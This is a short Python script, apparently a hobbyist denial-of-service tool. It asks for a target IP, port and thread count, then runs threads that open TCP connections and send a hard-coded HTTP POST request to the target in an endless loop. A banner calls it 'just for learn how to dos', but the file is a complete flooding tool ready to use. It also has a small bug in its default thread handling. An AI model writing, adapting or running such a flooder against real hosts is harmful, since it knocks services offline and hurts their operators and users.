import socket
import threading

success = []

print("========================\nThis code just for learn how to dos\n==========================")

ip = input("IP Target: ")
port = input("Port: ")
thread = input("Thread: ")

if not ip:
    print("Dont empty your ip target!")
    ip = input("IP Target: ")
if not port:
    print("I'm set your port to 80")
    port = 80
if not thread:
    print("I'm set your thread to 10")
    thrd = 10

data = f"POST http://{ip} HTTP/1.1\r\nHost: {ip}\r\nProxy-Connection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: python-requests/2.22.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\ndnt: 1\r\nX-Requested-With: Android\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: OGPC=19008563-24:\r\n\r\n"

def ViewPanel(ip,port):
  while True:
    print(f"[+] Sending - {ip}:{port} Entry Thread: {len(success)}",end='\r')

    try:
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((ip,port))
      s.sendall(data.encode())
      s.shutdown(1)
      success.append(1)
    except KeyboardInterrupt:
      print("Program has stopped")
    except socket.error:
      print('Socket Error')
      
def LoopThread(ip,port,thread):
  for i in range(int(thread)):
    run = threading.Thread(target=ViewPanel,args=(ip,int(port)))
    try:
      run.start()
    except:
      print("Failed To run")
      exit()

LoopThread(ip,port,thread)
